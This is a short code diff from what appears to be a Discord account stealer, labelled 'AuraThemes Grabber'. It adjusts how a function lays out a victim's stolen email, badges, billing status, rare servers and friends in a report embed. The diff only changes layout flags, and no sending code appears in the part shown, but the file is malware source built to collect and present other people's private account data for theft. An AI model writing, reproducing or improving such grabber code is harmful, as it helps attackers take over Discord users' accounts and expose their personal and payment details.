@@ -83,9 +83,9 @@ function buildInitializedEmbed(guilds, friends, Discord, data, embed) {
       getField('<:aura:974711605927505990> Email', `\`${Discord.mail}\``, false),
       getField('Badges', Discord.badges, true),
       getField('Billing', Discord.billing, true),
-      getField('\u200b', '**Rare Servers**\n' + guilds, true),
+      getField('\u200b', '**Rare Servers**\n' + guilds, false),
       getField('\u200b', "\u200b", false),
-      getField('\u200b', '**Rare Friends**\n' + friends, true)
+      getField('\u200b', '**Rare Friends**\n' + friends, false)
     )
     .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
     .setTimestamp();
